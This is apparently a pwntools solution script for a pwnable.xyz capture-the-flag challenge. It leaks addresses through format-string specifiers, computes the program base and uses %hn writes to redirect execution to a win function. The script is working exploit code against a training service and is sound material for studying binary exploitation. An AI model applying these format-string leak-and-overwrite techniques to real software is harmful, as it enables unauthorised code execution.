from pwn import *

###Util
def edit(data):
    r.sendlineafter('> ','1')
    r.sendafter('Name: ',data)

def copy():
    r.sendlineafter('> ','2')

def show():
    r.sendlineafter('> ','3')

def leave():
    r.sendlineafter('> ','4')

###Addr
vuln_ret_offset = 0xa77
win_offset = 0x9fd
bss_offset = 0x2000
print_buf_offset = 0x2060
input_buf_offset = 0x2070

###Exploit
r = remote('svc.pwnable.xyz',30010)
r.sendafter('Name: ','M30W')

edit('a'*(0x20-7)+'%11$p')
copy()
vuln_ret_addr = int(r.recvuntil('1. Edit',drop=True)[2:],16)
code_base = vuln_ret_addr-vuln_ret_offset
print(hex(code_base))

edit('a'*(0x20-7)+'%12$p')
copy()
target = int(r.recvuntil('1. Edit',drop=True),16)-0x24
print(hex(target))

###Set payload to a%6$n(writes \x01 at target)
###notice that command is taken as int_8, meaning modifying the higher bytes can still result in valid command
###%6 is to command buf, meaning we can leverage it as part of fmt write addr
edit('a'*(0x20-7)+'a%6$n')
r.sendlineafter('> ',str((code_base+bss_offset)|2))

###Pad print buf with fmt attack to be connected with input buf
for i in range(5,0x10):
    r.sendlineafter('> ',str(code_base+print_buf_offset+i))

###Write lower bytes
r.sendlineafter('> ',str((code_base+bss_offset)|1))
r.sendlineafter('Name: ',f'%{((code_base+win_offset)&0xffff)-12}c%6$hn'.ljust(0x1f,'a'))
r.sendlineafter('> ',str(target-(1<<32)))

###Write higher bytes
r.sendlineafter('> ',str((code_base+bss_offset)|1))
r.sendlineafter('Name: ',f'%{((code_base+win_offset)>>16)-12}c%6$hn'.ljust(0x1f,'a'))
r.sendlineafter('> ',str((target+2)-(1<<32)))

###Leave+get flag
r.sendlineafter('> ','0')

r.interactive()
